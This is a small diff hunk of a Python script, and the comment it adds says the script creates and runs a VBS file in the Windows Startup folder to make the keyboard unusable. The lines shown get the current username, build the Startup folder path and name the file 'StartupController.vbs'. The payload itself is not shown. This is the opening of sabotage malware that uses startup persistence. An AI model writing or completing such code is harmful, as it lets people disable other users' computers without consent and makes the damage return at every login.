@@ -1,6 +1,7 @@
 import getpass
 import os
 
+# creates and runs a .vbs file in the windows startup directory that makes the keyboard unusable
 username = getpass.getuser()
 startupdir = f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 filename = "StartupController.vbs"
